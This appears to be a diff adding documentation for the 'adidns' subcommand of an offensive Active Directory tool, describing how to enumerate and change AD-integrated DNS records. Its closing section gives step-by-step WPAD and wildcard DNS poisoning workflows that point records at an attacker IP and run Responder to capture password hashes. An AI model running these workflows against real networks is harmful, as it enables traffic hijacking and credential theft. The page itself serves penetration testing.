@@ -1,0 +1,184 @@
+# adidns
+
+Active Directory Integrated DNS (ADIDNS) enumeration and manipulation. ADIDNS stores DNS records directly as objects in Active Directory. By default, any authenticated domain user can add new records, making this a common vector for name poisoning attacks.
+
+---
+
+## Usage
+
+```
+r4t adidns <subcommand> [flags]
+```
+
+---
+
+## Subcommands
+
+### `adidns enum`
+
+Enumerate all ADIDNS records from Active Directory.
+
+```bash
+r4t adidns enum
+```
+
+Reads DNS node objects from the `DomainDnsZones` and/or `ForestDnsZones` application partitions in AD and displays all records. Results are stored in the `dns_records` table.
+
+---
+
+### `adidns add`
+
+Add a new DNS record to ADIDNS.
+
+```bash
+# Add an A record pointing to attacker IP
+r4t adidns add --record wpad --data 10.10.10.100
+
+# Add a wildcard A record
+r4t adidns add --record "*" --data 10.10.10.100
+
+# Add a CNAME record
+r4t adidns add --record malicious --type CNAME --data legitimate.corp.example.com
+
+# Add to the forest DNS zone
+r4t adidns add --record wpad --data 10.10.10.100 --forest
+
+# Custom TTL
+r4t adidns add --record wpad --data 10.10.10.100 --ttl 300
+
+# Add an SRV record
+r4t adidns add --record _custom._tcp --type SRV --data target.corp.example.com \
+  --priority 10 --weight 100 --port 8080
+```
+
+| Flag | Short | Type | Description |
+|------|-------|------|-------------|
+| `--record` | `-r` | string | Target record name (FQDN or relative name) **[required]** |
+| `--type` | `-t` | string | Record type: `A`, `AAAA`, `CNAME`, `SRV` (default: `A`) |
+| `--data` | `-D` | string | Record data (IP address, target hostname, etc.) **[required]** |
+| `--zone` | — | string | DNS zone (defaults to domain) |
+| `--forest` | — | bool | Use `ForestDnsZones` instead of `DomainDnsZones` |
+| `--legacy` | — | bool | Use the System partition (legacy DNS storage) |
+| `--allow-multiple` | — | bool | Allow multiple records with the same name |
+| `--ttl` | — | int | TTL in seconds (default: 180) |
+| `--dns-server` | — | string | DNS server IP for SOA serial lookup |
+| `--tcp` | — | bool | Use DNS over TCP for SOA lookup |
+| `--rpc` | — | bool | Use RPC instead of LDAP *(not yet implemented)* |
+| `--priority` | — | uint16 | SRV record priority |
+| `--weight` | — | uint16 | SRV record weight |
+| `--port` | — | uint16 | SRV record port |
+
+---
+
+### `adidns modify`
+
+Modify an existing ADIDNS record.
+
+```bash
+# Update an A record to a new IP
+r4t adidns modify --record wpad --data 10.10.10.200
+
+# Update in forest zone
+r4t adidns modify --record wpad --data 10.10.10.200 --forest
+```
+
+Shares the same flags as `adidns add` except `--allow-multiple` is not available.
+
+---
+
+### `adidns remove`
+
+Remove (tombstone) an ADIDNS record.
+
+```bash
+# Remove a record
+r4t adidns remove --record wpad
+
+# Remove from a specific zone
+r4t adidns remove --record wpad --zone corp.example.com
+```
+
+Tombstoning marks the record for deletion. The record is not immediately removed — AD replication handles cleanup.
+
+| Flag | Short | Type | Description |
+|------|-------|------|-------------|
+| `--record` | `-r` | string | Record name to remove **[required]** |
+| `--zone` | — | string | DNS zone |
+| `--forest` | — | bool | Use `ForestDnsZones` |
+| `--legacy` | — | bool | Use System partition |
+| `--dns-server` | — | string | DNS server for SOA lookup |
+| `--tcp` | — | bool | DNS over TCP |
+
+---
+
+### `adidns resurrect`
+
+Resurrect a tombstoned ADIDNS record.
+
+```bash
+r4t adidns resurrect --record wpad
+```
+
+Re-activates a previously tombstoned record. Uses the same flags as `adidns remove`.
+
+---
+
+### `adidns query`
+
+Query a specific ADIDNS record.
+
+```bash
+# Query an A record
+r4t adidns query --record wpad
+
+# Query with type filter
+r4t adidns query --record _ldap._tcp --type SRV
+```
+
+| Flag | Short | Type | Description |
+|------|-------|------|-------------|
+| `--record` | `-r` | string | Record name to query **[required]** |
+| `--type` | `-t` | string | Record type filter |
+| `--zone` | — | string | DNS zone |
+| `--forest` | — | bool | Use `ForestDnsZones` |
+| `--legacy` | — | bool | Use System partition |
+| `--dns-server` | — | string | DNS server for SOA lookup |
+| `--tcp` | — | bool | DNS over TCP |
+
+---
+
+## Common ADIDNS Attack Workflows
+
+### WPAD Poisoning
+
+WPAD (Web Proxy Auto-Discovery) abuse via ADIDNS:
+
+```bash
+# 1. Check if wpad record exists
+r4t adidns query --record wpad
+
+# 2. Add a WPAD record pointing to attacker machine
+r4t adidns add --record wpad --data 10.10.10.100
+
+# 3. Start Responder on the attacker machine to capture hashes
+# sudo responder -I eth0 -wP
+
+# 4. Clean up after capture
+r4t adidns remove --record wpad
+```
+
+### Wildcard Record Poisoning
+
+```bash
+# Add wildcard — all unresolved names return attacker IP
+r4t adidns add --record "*" --data 10.10.10.100 --allow-multiple
+
+# Remove when done
+r4t adidns remove --record "*"
+```
+
+---
+
+## DNS Record Storage
+
+Enumerated records are stored in the `dns_records` table in SQLite.
